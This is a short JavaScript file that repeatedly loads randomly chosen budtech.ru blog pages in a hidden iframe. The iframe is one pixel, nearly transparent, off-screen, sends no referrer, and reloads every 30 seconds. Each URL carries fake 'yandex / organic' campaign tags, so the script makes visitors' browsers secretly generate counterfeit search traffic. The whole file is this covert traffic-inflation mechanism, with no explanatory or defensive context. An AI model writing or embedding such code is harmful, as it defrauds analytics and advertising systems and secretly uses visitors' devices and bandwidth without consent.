const urls = [
  "https://www.budtech.ru/2023/09/ai.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
  "https://www.budtech.ru/2023/09/6g.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
  "https://www.budtech.ru/2023/09/blog-post.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
  "https://www.budtech.ru/2023/09/iot.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
  "https://www.budtech.ru/2023/09/xr.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
  "https://www.budtech.ru/2023/09/blog-post_13.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
  "https://www.budtech.ru/2023/09/blog-post_44.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
  "https://www.budtech.ru/2023/09/blog-post_67.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
  "https://www.budtech.ru/2023/09/blog-post_83.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
  "https://www.budtech.ru/2023/09/blog-post_82.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo"
];

function loadIframe() {
  const page = urls[Math.floor(Math.random() * urls.length)];
  const iframe = document.createElement("iframe");
  iframe.src = page;
  iframe.style = "width:1px; height:1px; opacity:0.01; position:absolute; left:-9999px;";
  iframe.referrerPolicy = "no-referrer";
  document.body.appendChild(iframe);
}

loadIframe();
setInterval(loadIframe, 30000);
